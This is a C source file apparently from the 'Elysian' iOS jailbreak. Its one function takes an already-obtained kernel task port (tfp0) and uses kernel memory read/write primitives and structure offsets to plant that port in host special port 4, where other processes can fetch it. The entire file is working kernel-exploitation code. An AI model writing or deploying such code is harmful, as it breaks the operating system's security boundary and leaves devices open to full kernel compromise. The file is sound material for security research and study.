//
//  sethsp4.c
//  Elysian
//
//  Created by chris  on 4/2/20.
//  Copyright © 2020 chr1s_0x1. All rights reserved.
//
#include "pac/parameters.h"
#include "pac/kernel.h"
#include "pac/kernel_memory.h"
#include "sethsp4.h"
#import "exploit.h"
#import "kernel_memory.h"

int set_tfp0_hsp4(mach_port_t tfp0) {
    printf("Exporting tfp0 to HSP4..\n");
 
    // get our host, and host port
    host_t host_self = mach_host_self();
    uint64_t host_port = find_port(host_self);
    
    // translate userland mach port to kernel pointer using our own task
    uint64_t mytask = find_self_task();
    printf("[set hsp4] Found our task 0x%llx \n", mytask);
    kern_return_t ret = mach_ports_register(mach_task_self(), &tfp0, 1);
    if(ret != KERN_SUCCESS) {
        printf("[set hsp4] Failed to register ports\n");
        return 1;
    }
    
    
    uint64_t hsp4 = rk64(mytask + OFFSET(task, itk_registered));
    
    // Set hsp4
    wk32(host_port + OFFSET(ipc_port, ip_bits), io_makebits(1, IOT_PORT, IKOT_HOST_PRIV));
    uint64_t realhost = rk64(host_port + OFFSET(ipc_port, ip_kobject));
    wk64(realhost + OFFSET(host, special) + 4 * sizeof(uint64_t),
         hsp4);
    
    // check if we successfully set hsp4
    static task_t test = MACH_PORT_NULL;
    host_get_special_port(host_self, HOST_LOCAL_NODE, 4, &test);
    
    if(!MACH_PORT_VALID(test)) {
        printf("[set hsp4] Failed to set HSP4 port\n");
        return 1;
    }
    
    
    printf("[set hsp4] Exported tfp0 to HSP4");
    test = MACH_PORT_NULL;
    return 0;
}
